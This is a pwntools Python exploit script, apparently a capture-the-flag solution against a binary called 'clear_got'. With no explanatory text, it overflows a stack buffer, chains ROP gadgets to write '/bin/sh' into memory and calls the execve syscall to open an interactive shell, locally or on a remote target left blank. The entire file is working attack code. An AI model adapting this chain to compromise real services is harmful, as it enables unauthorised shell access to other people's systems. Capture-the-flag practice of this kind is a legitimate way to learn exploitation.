#!/usr/bin/python3

from pwn import *

exe = ELF('clear_got', checksec=False)
libc = ELF('/usr/lib/x86_64-linux-gnu/libc.so.6', checksec=False)
context.binary = exe


def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
                b* 0x40075c

                c
                ''')
        input()


def info(msg): return log.info(msg)
def sla(msg, data): return p.sendlineafter(msg, data)
def sa(msg, data): return p.sendafter(msg, data)
def sl(data): return p.sendline(data)
def s(data): return p.send(data)


if args.REMOTE:
    p = remote('')
else:
    p = process(exe.path)

GDB()
pop_rdi = 0x00000000004007f3
pop_rsi_r15 = 0x00000000004007f1
pop_rdx = 0x00000000004007EA
syscall = 0x000000000040077e
payload = b"a"*0x68
payload += p64(0x4007EA) ##ret1
payload += p64(0xc01c8) #rbx
payload += p64(0xc01c9) #rbp
payload += p64(0) #r12
payload += p64(59) #rdx
payload += p64(0x601060) #rsi bss
payload += p64(0) #rdi
payload += p64(0x4007d0) #######ret
payload += b"A"*8
payload += p64(0xc020d) #rbx
payload += p64(0xc020e) #rbp
payload += p64(0) #r12
payload += p64(0) #rdx
payload += p64(0) #rsi
payload += p64(0x601060) #rdi execve
payload += p64(0x40076e) #syscall
payload += p64(0x4007d0)*2 #
sa(b'///\n', payload)

payload = b"/bin/sh\x00" + p64(0x40076e) + b"\x00"*43
p.sendline(payload)
# libc.address = u64(p.recv(8))
# info("libc.address: " + hex(libc.address))
p.interactive()
